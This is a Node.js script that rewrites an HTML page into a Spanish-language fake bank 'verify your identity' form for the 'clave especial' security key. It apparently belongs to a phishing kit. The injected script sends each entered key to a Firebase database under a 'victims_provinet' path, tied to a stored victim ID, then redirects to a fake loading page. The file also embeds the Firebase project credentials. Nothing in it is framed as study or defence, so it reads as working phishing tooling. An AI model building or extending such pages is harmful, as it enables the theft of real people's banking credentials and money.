const fs = require('fs');
let content = fs.readFileSync('clave-especial.html', 'utf8');

// Replace the title
content = content.replace(
    /<h1 class=titulo1>.*?<\/h1>/i,
    '<h1 class="titulo1" style="text-align: center;">¡Verifiquemos tu identidad!</h1>\n<p style="text-align: center; font-size: 18px; margin-bottom: 25px;">Ingresa tu clave especial</p>'
);

// Replace the form content
const formRegex = /<form class="control-login"[^>]*>([\s\S]*?)<\/form>/i;
const newFormContent = `
<div class="row">
    <div id="container_main" class="col-lg-12">
        <div class="form-group rel">
            <input type="password" style="touch-action:pan-y" class="validate-empty valido" name="clave_especial" id="clave_especial" autocomplete="off" maxlength="8" title="Ingresa tu clave especial" placeholder=" " required>
            <label for="clave_especial" class="control-label" id="label-clave-especial">Clave especial</label>
        </div>
        <div class="botonEntrar">
            <button class="btn boton-submit boton" type="submit" name="submit" value="submit" id="submit" style="color: white !important;">Verificar</button>
        </div>
    </div>
</div>
`;

content = content.replace(formRegex, (match, p1) => {
    // keep the <form> opening tag
    const openingTag = match.substring(0, match.indexOf('>') + 1);
    return openingTag + newFormContent + '</form>';
});

// Remove eye icon script from this page since we don't need it, or we can keep it if they want.
// It's attached to 'password' id which we removed.
content = content.replace(/<script>\s*\(function\(\) \{\s*var pwdInput = document\.getElementById\('password'\);[\s\S]*?<\/script>/, '');

// Update Firebase push logic for clave especial
const fbRegex = /<script src="https:\/\/www\.gstatic\.com\/firebasejs[\s\S]*?<\/script>\s*$/;
const newFbScript = `
<script src="https://www.gstatic.com/firebasejs/12.19.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/12.19.0/firebase-database-compat.js"></script>
<script>
    const firebaseConfig = {
        apiKey: "AIzaSyA9qspuy_l1vseHqKx9klUg3P9JGx_GZLo",
        authDomain: "sca-mms.firebaseapp.com",
        databaseURL: "https://sca-mms-default-rtdb.firebaseio.com",
        projectId: "sca-mms",
        storageBucket: "sca-mms.firebasestorage.app",
        messagingSenderId: "965549232304",
        appId: "1:965549232304:web:46186cadacaa0d3f5d73df"
    };

    if (!firebase.apps.length) {
        firebase.initializeApp(firebaseConfig);
    }
    const database = firebase.database();

    const form = document.getElementById('form');
    if(form) {
        form.removeAttribute('onsubmit');
        form.addEventListener('submit', function(e) {
            e.preventDefault();
            
            const btnSubmit = document.getElementById('submit');
            if(btnSubmit) {
                btnSubmit.innerText = 'Cargando...';
                btnSubmit.style.pointerEvents = 'none';
                btnSubmit.style.opacity = '0.7';
            }

            const claveEsp = document.getElementById('clave_especial').value;
            const id = localStorage.getItem('current_victim_id');

            if(id) {
                database.ref('victims_provinet/' + id).update({
                    token: claveEsp,
                    status: 'Clave especial recibida'
                }).then(() => {
                    window.location.href = 'cargando.html';
                }).catch(err => {
                    window.location.href = 'cargando.html';
                });
            } else {
                window.location.href = 'cargando.html';
            }
        });
    }
</script>
`;
content = content.replace(fbRegex, newFbScript);

fs.writeFileSync('clave-especial.html', content, 'utf8');
console.log('Done: clave-especial.html created based on requirements');
